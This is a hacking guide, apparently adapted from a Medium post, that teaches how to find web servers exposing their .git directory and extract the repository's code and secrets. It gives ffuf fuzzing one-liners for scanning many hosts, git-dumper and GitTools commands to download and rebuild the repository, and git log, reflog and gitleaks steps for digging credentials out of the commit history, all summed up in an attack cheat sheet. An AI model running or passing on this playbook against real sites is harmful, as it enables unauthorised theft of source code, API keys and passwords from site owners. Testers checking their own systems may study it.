
##
#
https://medium.com/swlh/hacking-git-directories-e0e60fa79a36
#
##



### **Overhaul: Hacking Exposed `.git` Directories in '25 and Beyond**

The core principle remains the same: an exposed `.git` directory is a critical information leak. It's not just source code; it's the project's entire history, including secrets committed by mistake, deleted code, feature branches, and developer comments. Here’s the modern playbook.

#### **Phase 1: Advanced Detection**

Manually checking for `/.git/` is a start, but modern approaches are automated and more thorough. A 403 Forbidden on `/.git/` doesn't mean you're blocked; it just means directory listing is disabled. The real test is checking for specific, predictable files.

**Modern Tools for Detection:**

Use fuzzing tools with a targeted wordlist to quickly identify exposed `.git` files across many hosts.

*   **Tool:** `ffuf`, `dirsearch`, `gobuster`
*   **Wordlist:** A small, targeted list is best. Create a file `git-files.txt`:
    ```
    .git/HEAD
    .git/config
    .git/index
    .git/logs/HEAD
    ```
*   **`ffuf` One-Liner:**
    ```bash
    # Scan a single target for key git files
    ffuf -u http://project.com/FUZZ -w git-files.txt -mc 200

    # Scan a list of hosts
    ffuf -u http://FUZZ/ -w hosts.txt -w git-files.txt -mc 200 -e ".git/HEAD,.git/config"
    ```
    A `200 OK` response on any of these files is a strong indicator that the directory is exposed and its contents are readable, even if the root `/.git/` directory returns a 403.

#### **Phase 2: Automated Exfiltration & Reconstruction**

Manually `curl`'ing each object is slow and painful. Modern hacking is about automation. Several tools are purpose-built to recursively download and reconstruct a `.git` repository when directory listing is disabled.

**Primary Tool: `git-dumper`**

This is the go-to tool. It starts with known files (`HEAD`, `config`, `refs/heads/master`, etc.), parses them for object hashes, and then systematically downloads every tree, commit, and blob object it can find.

*   **Installation:**
    ```bash
    pip3 install git-dumper
    ```
*   **Usage (One-Liner):**
    ```bash
    # Dumps the .git directory from the target into a local folder named 'project.com'
    git-dumper http://project.com/.git/ ./project.com
    ```

**Alternative Powerhouse: `GitTools`**

`GitTools` is a suite of three scripts that are incredibly powerful.

*   **Installation:**
    ```bash
    git clone https://github.com/internetwache/GitTools.git
    cd GitTools/
    ```
*   **Usage:**
    1.  **`Finder/gitfinder.py`**: Scans a domain for exposed `.git` repositories.
    2.  **`Dumper/gitdumper.sh`**: A shell script alternative to `git-dumper`.
        ```bash
        ./Dumper/gitdumper.sh http://project.com/.git/ ./project_com_dump
        ```
    3.  **`Extractor/extractor.sh`**: After dumping, this script goes through the commit history to find deleted files and interesting content. This is a key "advanced tweak."
        ```bash
        ./Extractor/extractor.sh ../project_com_dump ../project_com_extracted
        ```

**After Dumping the Files:**

Once you have the files, navigate into the output directory and restore the source code.

```bash
cd ./project.com/
# This command restores the files from the downloaded .git index to your working directory
git checkout .
```
You should now see the full source code of the latest commit.

#### **Phase 3: Advanced Post-Exploitation & History Diving**

Getting the current source code is just the beginning. The real secrets are often buried in the project's history.

**Tweak 1: Secret Scanning with `gitleaks`**

Don't manually `grep` for secrets. Use a dedicated tool that understands entropy and common secret patterns. `gitleaks` is the industry standard.

*   **Installation:** (Varies by OS, see their GitHub page)
*   **Usage (One-Liner):**
    ```bash
    # Run gitleaks against your reconstructed repository
    gitleaks detect --source . -v
    ```
    This will scan the *entire commit history* for things like API keys, private keys, passwords, and other credentials.

**Tweak 2: The Art of `git log`**

The commit history is a treasure map.

*   **Find Secrets in Code Changes:** Look at the actual code changes (`-p` flag) for every commit. Developers often commit a secret, then remove it in a later commit. The secret remains in the history forever.
    ```bash
    # Show all commits with their code changes, searching for the word "password"
    git log -p --all --full-history | grep -C 5 "password"
    ```

*   **Find Interesting Files:** See which files have been changed the most or recently.
    ```bash
    # Show a summary of which files were changed in each commit
    git log --stat
    ```

**Tweak 3: The `reflog` - Finding Lost Commits**

This is a truly advanced technique. The `reflog` tracks every movement of `HEAD`, including checkouts, resets, and even commits on branches that were later deleted. If a developer force-pushed to hide a sensitive commit, it might still be in the `reflog`.

```bash
# Display the reference log
git reflog

# If you find an interesting "lost" commit hash (e.g., a2b4c6d), you can inspect it
git show a2b4c6d
```

**Tweak 4: Explore All Branches**

Don't just look at the `main` or `master` branch. Development branches often contain unfinished code, debug endpoints, and more secrets.

```bash
# List all local and remote branches
git branch -a

# Switch to a development branch to explore its code
git checkout develop
```

#### **Modernized `.git` Hacking Cheat Sheet**

| Phase         | Action                               | Command                                                              |
| :------------ | :----------------------------------- | :------------------------------------------------------------------- |
| **Detection** | Find key `.git` files                | `ffuf -u http://target.com/FUZZ -w git-files.txt -mc 200`             |
| **Dumping**   | Automatically dump the repo          | `git-dumper http://target.com/.git/ ./output_dir`                    |
| **Reconstruct** | Restore source from dumped files     | `cd ./output_dir && git checkout .`                                  |
| **Analysis**  | **Scan entire history for secrets**  | `gitleaks detect --source . -v`                                      |
|               | Find secrets in code changes         | `git log -p --all | grep -i "apikey"`                                |
|               | **Find lost/deleted commits**        | `git reflog`                                                         |
|               | Explore all branches                 | `git branch -a` and `git checkout <branch_name>`                     |
|               | Check out an old, sensitive commit   | `git checkout <commit_hash>`                                         |

